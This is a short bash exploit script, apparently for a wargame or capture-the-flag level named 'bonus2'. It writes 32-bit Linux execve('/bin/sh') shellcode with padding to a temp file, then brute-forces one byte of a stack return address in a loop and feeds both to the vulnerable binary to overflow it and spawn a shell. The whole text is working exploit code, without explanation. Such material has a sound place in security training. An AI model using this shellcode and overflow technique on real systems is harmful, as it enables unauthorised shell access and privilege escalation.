#!/bin/bash

i=100

while [ $i  -lt 255 ]
do
   x=`printf "\x%02x\n"  $i`
echo -n -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/b21 && echo -n -e "01234567890123456789012" > /tmp/b22 && echo -n -e $x >> /tmp/b22 && echo -e "\xf5\xff\xbf" >> /tmp/b22 && ~/bonus2 `cat /tmp/b21` `cat /tmp/b22`
   echo $x
   i=`expr $i + 1`
done
